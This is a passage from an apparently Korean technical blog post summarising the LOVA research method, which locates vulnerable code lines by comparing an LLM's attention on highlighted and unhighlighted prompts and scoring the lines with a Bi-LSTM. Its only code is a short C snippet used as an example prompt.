&#xD22C;&#xD45C;&#xB97C; &#xD558;&#xAC70;&#xB098; &#xC810;&#xC218;&#xB97C; &#xB9E4;&#xAE30;&#xB294; &#xB4F1; &#xBD88;&#xC644;&#xC804;&#xD55C; &#xBC29;&#xBC95;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>Stochastic decoding(&#xD655;&#xB960;&#xC801; &#xB514;&#xCF54;&#xB529;)&#xC740; LLM&#xC774; &#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xB2E4;&#xC74C; &#xD1A0;&#xD070;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xBC29;&#xC2DD; &#xC911; &#xD558;&#xB098;&#xB85C; &#xACC4;&#xC0B0;&#xB41C; &#xD655;&#xB960; &#xBD84;&#xD3EC;&#xC5D0;&#xC11C; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xD1A0;&#xD070;&#xC744; &#xC0D8;&#xD50C;&#xB9C1;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xD655;&#xB960;&#xC774; &#xAC00;&#xC7A5; &#xB192;&#xC740; &#xD1A0;&#xD070;&#xC744; &#x2018;&#xD56D;&#xC0C1;&#x2019; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xAC01; &#xD1A0;&#xD070;&#xC758; &#xD655;&#xB960;&#xC5D0; &#xBE44;&#xB840;&#xD558;&#xC5EC; &#xC120;&#xD0DD;&#xB420; &#xAE30;&#xD68C;&#xB97C; &#xC8FC;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xBC18;&#xB300;&#xB85C; Deterministic Decoding(&#xACB0;&#xC815;&#xB860;&#xC801; &#xB514;&#xCF54;&#xB529;)&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xD655;&#xB960;&#xC774; &#xAC00;&#xC7A5; &#xB192;&#xC740; &#xD1A0;&#xD070;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB9E4;&#xBC88; &#xB3D9;&#xC77C;&#xD55C; &#xC785;&#xB825;&#xC5D0; &#xB300;&#xD574; &#xB3D9;&#xC77C;&#xD55C; &#xCD9C;&#xB825;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xC9C0;&#xB9CC;, &#xBC18;&#xBCF5;&#xC801;&#xC774;&#xACE0; &#xB35C; &#xCC3D;&#xC758;&#xC801;&#xC778; &#xACB0;&#xACFC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#x201C;&#xC774;&#xB7EC;&#xD55C; &#xBB34;&#xC791;&#xC704;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xACB0;&#xACFC;&#xC758; &#xC815;&#xD655;&#xB3C4; &#xD5A5;&#xC0C1;&#xB3C4; &#xBBF8;&#xBBF8;&#xD558;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC815;&#xD655;&#xD55C; &#xC704;&#xCE58;&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xAE30;&#xAC00; &#xD798;&#xB4E4;&#xB2E4;!&#x201D;&#xAC00; &#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC81C;&#xC2DC;&#xD558;&#xB294; &#xB450; &#xBC88;&#xC9F8; &#xBB38;&#xC81C;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="2-2-&#xAC00;&#xC124;-&#xBC0F;-&#xC2E4;&#xD5D8;"><a href="#2-2-&#xAC00;&#xC124;-&#xBC0F;-&#xC2E4;&#xD5D8;" class="headerlink" title="2.2 &#xAC00;&#xC124; &#xBC0F; &#xC2E4;&#xD5D8;"></a>2.2 &#xAC00;&#xC124; &#xBC0F; &#xC2E4;&#xD5D8;</h2><h3 id="1-&#xAC00;&#xC124;"><a href="#1-&#xAC00;&#xC124;" class="headerlink" title="1) &#xAC00;&#xC124;"></a>1) &#xAC00;&#xC124;</h3><ol><li>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xCC3E;&#xC744; &#xB54C; &#xD2B9;&#xC815; &#xB77C;&#xC778;&#xC5D0; &#xC5B4;&#xD150;&#xC158;&#xC744; &#xD558;&#xAC8C; &#xB41C;&#xB2E4;.</li><li>&#xD2B9;&#xC815; &#xB77C;&#xC778;&#xC5D0;&#xC11C; &#xCC3E;&#xC73C;&#xB77C;&#xACE0; &#xD558;&#xBA74; &#xC5B4;&#xD150;&#xC158;&#xC774; &#xB354; &#xAC15;&#xD558;&#xAC8C; &#xB418;&#xC11C; &#xC815;&#xD655;&#xB3C4;&#xB97C; &#xC62C;&#xB9B4; &#xC218; &#xC788;&#xB2E4;.</li><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB77C;&#xC778;&#xC740; &#xBAA8;&#xB378; &#xCD9C;&#xB825;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xAC83;&#xC774;&#xB2E4;.</li><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xB77C;&#xC778;&#xC744; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD574;&#xB3C4; &#xACB0;&#xACFC;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB2E4;.</li></ol><h3 id="2-&#xC2E4;&#xD5D8;"><a href="#2-&#xC2E4;&#xD5D8;" class="headerlink" title="2) &#xC2E4;&#xD5D8;"></a>2) &#xC2E4;&#xD5D8;</h3><p>&#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; self-attention&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xBA3C;&#xC800; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs yaml"><span class="hljs-attr">Code:</span>    <span class="hljs-string">....</span> <span class="hljs-attr">8:</span>     <span class="hljs-string">glyphs</span> <span class="hljs-string">=</span> <span class="hljs-string">(cairo_glyph_t</span> <span class="hljs-string">*)</span> <span class="hljs-string">gmalloc</span> <span class="hljs-string">(len</span>    <span class="hljs-string">*</span> <span class="hljs-string">sizeof</span> <span class="hljs-string">(cairo_glyph_t));</span> <span class="hljs-attr">9:</span>     <span class="hljs-string">glyphCount</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span><span class="hljs-attr">10:</span> <span class="hljs-string">}</span><span class="hljs-string">Pay</span> <span class="hljs-string">attention</span> <span class="hljs-string">to</span> <span class="hljs-string">line</span> {<span class="hljs-number">8</span>}<span class="hljs-string">.</span> <span class="hljs-string">Check</span> <span class="hljs-string">whether</span> <span class="hljs-string">there</span> <span class="hljs-string">are</span> <span class="hljs-string">vulnerabilities</span> <span class="hljs-string">in</span> <span class="hljs-string">it.</span><span class="hljs-attr">vulnerable line:</span> <span class="hljs-string">```</span></code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC704;&#xC640; &#xAC19;&#xC774; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA74; ``` &#xB4A4;&#xC5D0; &#xB2E8;&#xC5B4;&#xB97C; &#xC608;&#xCE21;&#xD560; &#xB54C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xAC00;&#xC7A5; &#xB192;&#xAC8C; &#xC5B4;&#xD150;&#xC158;&#xD558;&#xACA0;&#xC8E0;? &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xC5B4;&#xB5A4; &#xB77C;&#xC778;&#xC778;&#xC9C0; &#xAE4C;&#xC9C0; &#xC54C;&#xB824;&#xC918;&#xC11C; &#xAC00;&#xC911;&#xCE58;&#xC758; &#xBCC0;&#xD654;&#xB97C; &#xADF9;&#xB300;&#xD654;&#xD574; &#xBCC0;&#xD654;&#xB97C; &#xAD00;&#xCC30;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/11/j0ker/llm_part3/kr/3.png" alt="index_img"></p><p>&#xC2E4;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xC774;&#xB97C; &#xBCA0;&#xC774;&#xC2A4;&#xB85C; &#xCF54;&#xB4DC;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC778;&#xC704;&#xC801;&#xC73C;&#xB85C; &#xC0BD;&#xC785;&#xD574; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD55C; &#xACB0;&#xACFC;,</p><ol><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC758; &#xC5B4;&#xD150;&#xC158;&#xC744; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; 70&#xBC88;&#xC9F8; &#xB77C;&#xC778;&#xC744; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xB2E4;&#xB978; &#xB77C;&#xC778;&#xB4E4;&#xC758; &#xAC00;&#xC911;&#xCE58;&#xAC00; &#xB192;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xB098;&#xC640; &#xC81C;&#xB300;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC5D0; 70&#xBC88;&#xC9F8; &#xB77C;&#xC778;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8;&#xD574;&#xC11C; &#xC5B4;&#xD150;&#xC158;&#xC744; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC; 70&#xBC88;&#xC9F8; &#xB77C;&#xC778;&#xC774; &#xC880; &#xB354; &#xAC00;&#xC911;&#xCE58;&#xAC00; &#xC62C;&#xB77C;&#xAC14;&#xACE0; &#xC2E4;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xAC00;&#xC911;&#xCE58;&#xAC00; &#xB354; &#xB192;&#xAC8C; &#xB098;&#xD0C0;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xAC04;&#xB2E8;&#xD55C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5B4;&#xB290;&#xC815;&#xB3C4; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="3-LOVA-LO-cating-Vulnerabilities-via-Attention"><a href="#3-LOVA-LO-cating-Vulnerabilities-via-Attention" class="headerlink" title="3. LOVA(LO-cating Vulnerabilities via Attention)"></a>3. LOVA(LO-cating Vulnerabilities via Attention)</h1><p><img src="/2025/08/11/j0ker/llm_part3/kr/4.png" alt="index_img"></p><p>&#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC81C;&#xC548;&#xD558;&#xB294; LOVA&#xB294; &#xC704;&#xC5D0;&#xC11C; &#xC2E4;&#xD5D8;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xCF54;&#xB4DC;&#xC640; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD55C; &#xCF54;&#xB4DC;&#xC758; &#xAC00;&#xC911;&#xCE58;&#xB97C; &#xBE44;&#xAD50;&#xD574; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD560; &#xD655;&#xB960;&#xC774; &#xAC00;&#xC7A5; &#xB192;&#xC740; &#xCF54;&#xB4DC; &#xB77C;&#xC778;&#xC744; &#xCC3E;&#xC544;&#xB0C5;&#xB2C8;&#xB2E4;.<br>&#xD06C;&#xAC8C; Code Line Highlight, Attention Calculation, Vulnerability Line Localization 3&#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xC529; &#xCC28;&#xADFC;&#xCC28;&#xADFC; &#xB72F;&#xC5B4;&#xBCF4;&#xC8E0;!</p><h2 id="3-1-Code-Line-Highlight"><a href="#3-1-Code-Line-Highlight" class="headerlink" title="3.1 Code Line Highlight"></a>3.1 Code Line Highlight</h2><p>LOVA&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xBC84;&#xC804;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xB294; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xAC74;&#xB4DC;&#xB9AC;&#xC9C0; &#xC54A;&#xC740; &#xC6D0;&#xBCF8; &#xCF54;&#xB4DC;(Base prompt), &#xB2E4;&#xB978; &#xD558;&#xB098;&#xB294; &#xCF54;&#xB4DC; &#xD55C; &#xC904; &#xD55C; &#xC904;&#xC744; &#xB3CC;&#xC544;&#xAC00;&#xBA74;&#xC11C; &#xAC15;&#xC870;&#xD55C; &#xBC84;&#xC804;(Highlighted prompts)&#xC785;&#xB2C8;&#xB2E4;.  &#xB9CC;&#xC57D; &#xCF54;&#xB4DC;&#xAC00; 100&#xC904;&#xC774;&#xB77C;&#xBA74;, 1&#xAC1C;&#xC758; &#xC6D0;&#xBCF8; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC640; 100&#xAC1C;&#xC758; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8;&#xB41C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xD558;&#xB098; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xC8FC;&#xC11D;&#xC73C;&#xB85C; <code>// &#xC5EC;&#xAE30; &#xC880; &#xBD10;&#xC918;!</code> &#xB77C;&#xACE0; &#xD558;&#xAC70;&#xB098; &#xD2B9;&#xC815; &#xD0A4;&#xC6CC;&#xB4DC;&#xB97C; &#xB123;&#xB294; &#xBC29;&#xC2DD;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xAE38;&#xC5B4;&#xC9C0;&#xBA74; LLM&#xC774; &#xADF8;&#xB0E5; &#xBB34;&#xC2DC;&#xD574;&#xBC84;&#xB9AC;&#xAC70;&#xB098;, &#xC624;&#xD788;&#xB824; hallucination&#xC774; &#xBC1C;&#xC0DD;&#xD574; &#xBA40;&#xCA61;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xCDE8;&#xC57D;&#xD558;&#xB2E4;&#xACE0; &#xCC29;&#xAC01;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; LOVA&#xC5D0;&#xC11C;&#xB294; <strong>&#xCF54;&#xB4DC; &#xB77C;&#xC778; &#xC778;&#xB371;&#xC2A4;</strong>&#xB97C; &#xC9C1;&#xC811; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC; &#xC55E;&#xC5D0; &#xBC88;&#xD638;&#xB97C; &#xCAD9; &#xBD99;&#xC5EC;&#xC8FC;&#xACE0;, &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC5D0; &#x2018;8&#xBC88; &#xB77C;&#xC778;&#xC5D0; &#xC9D1;&#xC911;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xBD10;&#xC918;!&#x2019; &#xB77C;&#xACE0; &#xBA85;&#xC2DC;&#xD558;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><h2 id="3-2-Attention-Calculation"><a href="#3-2-Attention-Calculation" class="headerlink" title="3.2 Attention Calculation"></a>3.2 Attention Calculation</h2><p>&#xB2E4;&#xC74C;&#xC740; &#xAC01; &#xB77C;&#xC778;&#xC744; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD588;&#xC744; &#xB54C; LLM&#xC758; &#x2018;&#xAD00;&#xC2EC;&#xB3C4;(Attention)&#x2019;&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xBCC0;&#xD558;&#xB294;&#xC9C0; &#xC815;&#xB7C9;&#xC801;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. LLM&#xC774; &#xBC49;&#xC5B4;&#xB0B4;&#xB294; &#xC5B4;&#xD150;&#xC158; &#xB370;&#xC774;&#xD130;&#xB294; (num_tokens, num_tokens, num_layers, num_heads) &#xD615;&#xD0DC;&#xC758; &#xC5B4;&#xB9C8;&#xC5B4;&#xB9C8;&#xD558;&#xAC8C; &#xD070; &#xD150;&#xC11C;(Tensor)&#xC785;&#xB2C8;&#xB2E4;.  &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; 1000&#xD1A0;&#xD070;&#xC9DC;&#xB9AC; &#xCF54;&#xB4DC;&#xB9CC; &#xD574;&#xB3C4; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC218;&#xC5B5; &#xAC1C;&#xAC00; &#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294;&#xB370;&#x2026; &#xADF8;&#xB7FC; &#xC81C;&#xAC00; &#xC9C1;&#xC811; &#xBD84;&#xC11D;&#xD558;&#xB294;&#xAC8C; &#xB354; &#xBE60;&#xB974;&#xACA0;&#xC8E0;?</p><p>LOVA&#xB294; &#xC774; &#xAC70;&#xB300;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#x2018;&#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB9CC;&#x2019; &#xB0A8;&#xAE30;&#xB3C4;&#xB85D; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xCC28;&#xC6D0; &#xCD95;&#xC18C;(Dimensionality Reduction)&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/11/j0ker/llm_part3/kr/5.png" alt="index_img"></p><blockquote><p>Step 1 ~ 4&#xAE4C;&#xC9C0;&#xC758; &#xC288;&#xB3C4;&#xCF54;&#xB4DC;</p></blockquote><ol><li>&#xBAA8;&#xB4E0; &#xD5E4;&#xB4DC;&#xC758; &#xC5B4;&#xD150;&#xC158;&#xC744; (num_tokens, num_tokens, num_layers) &#xD615;&#xD0DC;&#xC758; &#xD558;&#xB098;&#xC758; &#xC5B4;&#xD150;&#xC158; &#xB9F5;&#xC73C;&#xB85C; &#xD569;&#xC0B0;&#xD55C; &#xB4A4; &#xBCD1;&#xD569;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xAC01; &#xB808;&#xC774;&#xC5B4;&#xC758; &#xC5B4;&#xD150;&#xC158;&#xC740; &#xC11C;&#xB85C; &#xACE0;&#xC720;&#xC758; &#xC758;&#xBBF8;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC720;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB9C8;&#xC9C0;&#xB9C9; &#xD1A0;&#xD070;&#xC744; &#xCFFC;&#xB9AC;(Q)&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC774;&#xC804;&#xC758; &#xBAA8;&#xB4E0; &#xD1A0;&#xD070;&#xC5D0;&#xC11C; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740; &#xC5B4;&#xD150;&#xC158;&#xC744; &#xAC00;&#xC9C0;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; (num_tokens, num_layers) &#xD06C;&#xAE30;&#xC758; &#xD589;&#xB82C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xAC01; &#xB77C;&#xC778;&#xC758; &#xBAA8;&#xB4E0; &#xD1A0;&#xD070;&#xC758; &#xC5B4;&#xD150;&#xC158; &#xAC12;&#xC744; &#xD569;&#xC0B0;&#xD558;&#xC5EC; &#xD55C; &#xB77C;&#xC778;&#xC758; &#xC804;&#xCCB4; &#xC5B4;&#xD150;&#xC158; &#xAC12;&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; (num_lines, num_layers) &#xD06C;&#xAE30;&#xC758; &#xD589;&#xB82C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC774; &#xD589;&#xB82C;&#xC744; LayerwiseAttnMat&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</li><li><p>&#xAC15;&#xC870; &#xD45C;&#xC2DC;&#xB41C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC758; LayerwiseAttnMat&#xC640; &#xAE30;&#xBCF8; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xAC04;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; DiffAttnMat&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xB77C;&#xC778;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xBCF4;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C;, &#xC2E4;&#xC81C; &#xBCC0;&#xD654;&#xAC00; &#xAC00;&#xC7A5; &#xD074; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xB418;&#xB294; &#x2018;&#xC9C0;&#xC2DC;&#xBB38;&#x2019;&#xACFC; &#x2018;&#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8;&#xB41C; &#xB77C;&#xC778;&#x2019;&#xC758; &#xB370;&#xC774;&#xD130;&#xB9CC; &#xBF51;&#xC544;&#xC640; &#xCD5C;&#xC885;&#xC801;&#xC778; <code>VulnAttnMat</code>&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p> <img src="/2025/08/11/j0ker/llm_part3/kr/6.png" alt="image.png"></p></li></ol><h2 id="3-3-Vulnerability-Line-Localization"><a href="#3-3-Vulnerability-Line-Localization" class="headerlink" title="3.3 Vulnerability Line Localization"></a><strong>3.3 Vulnerability Line Localization</strong></h2><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xB2E8;&#xACC4;&#xB294; <code>VulnAttnMat</code>&#xC758; &#xD328;&#xD134;&#xC744; &#xBCF4;&#xACE0; &#xC9C4;&#xC9DC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xB77C;&#xC778;&#xC744; &#xACE8;&#xB77C;&#xB0B4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC21C;&#xD788; &#xC5B4;&#xD150;&#xC158; &#xBCC0;&#xD654;&#xB7C9; &#xD569;&#xACC4;&#xB85C; &#xC21C;&#xC704;&#xB97C; &#xB9E4;&#xAE38; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;, C&#xC5B8;&#xC5B4;&#xC758; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xD134;&#xACFC; &#xD30C;&#xC774;&#xC36C;&#xC758; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xD134;&#xC774; &#xB2E4;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5B8;&#xC5B4;&#xBCC4;&#xB85C; &#xC77C;&#xAD00;&#xB41C; &#xAE30;&#xC900;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xB610;, &#xC774;&#xAC74; &#xADF8;&#xB0E5; &#x2018;&#xC758;&#xC2EC; &#xC21C;&#xC704;&#x2019;&#xC77C; &#xBFD0;, &#x2018;&#xC774; &#xB77C;&#xC778;&#xC774; &#xCDE8;&#xC57D;&#xD560; &#xD655;&#xB960;&#xC774; 80%&#xB2E4;!&#x2019; &#xC640; &#xAC19;&#xC740; &#xC815;&#xD655;&#xD55C; &#xD310;&#xB2E8;&#xC744; &#xB0B4;&#xB824;&#xC8FC;&#xC9C4; &#xBABB;&#xD558;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; LOVA&#xB294; &#xC774; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; <strong>Bi-LSTM</strong>&#xC774;&#xB77C;&#xB294; &#xB525;&#xB7EC;&#xB2DD; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.(&#xC73C;&#xC73C;&#x2026; &#xC810;&#xC810;&#xB354; &#xBCF5;&#xC7A1;&#xD574;&#xC9C0;&#xB294;&#x2026;)</p><ol><li>&#xBA3C;&#xC800; &#xAC01; &#xB77C;&#xC778;&#xBCC4;&#xB85C; &#xACC4;&#xC0B0;&#xB41C; <code>VulnAttnMat</code>&#xC744; &#xAE38;&#xAC8C; &#xD3B8; &#xBCA1;&#xD130;&#xB85C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xBCA1;&#xD130; &#xC2DC;&#xD000;&#xC2A4;&#xB97C; Bi-LSTM &#xBAA8;&#xB378;&#xC5D0; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. Bi-LSTM&#xC744; &#xC4F0;&#xB294; &#xC774;&#xC720;&#xB294; &#xD2B9;&#xC815; &#xB77C;&#xC778;(A)&#xC774; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4;&#xC9C0; &#xD310;&#xB2E8;&#xD560; &#xB54C;, &#xADF8; &#xC55E;&#xB4A4; &#xB77C;&#xC778;(B, C)&#xB4E4;&#xC758; &#xC5B4;&#xD150;&#xC158; &#xD328;&#xD134;&#xACFC; &#xBE44;&#xAD50;&#xD574;&#xC11C; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xAC83;&#xC774; &#xB354; &#xC815;&#xD655;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xC758; &#xBB38;&#xB9E5;(Context)&#xC744; &#xC591;&#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xACE0;&#xB824;&#xD558;&#xB294; &#xAC70;&#xC8E0;.</li><li>&#xBAA8;&#xB378;&#xC740; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xAC01; &#xB77C;&#xC778;&#xC5D0; &#xB300;&#xD574; 0&#xACFC; 1 &#xC0AC;&#xC774;&#xC758; &#x2018;&#xC758;&#xC2EC; &#xC810;&#xC218;(Suspicious Score)&#x2019;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xACE0;, &#xC774; &#xC810;&#xC218;&#xAC00; 0.5&#xB97C; &#xB118;&#xC73C;&#xBA74; &#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB77C;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ol><h1 id="4-&#xACB0;&#xACFC;"><a href="#4-&#xACB0;&#xACFC;" class="headerlink" title="4. &#xACB0;&#xACFC;"></a>4. &#xACB0;&#xACFC;</h1><p>&#xD14C;&#xC2A4;&#xD2B8;&#xB294; Big-Vul, SmartFix, CVEFixes 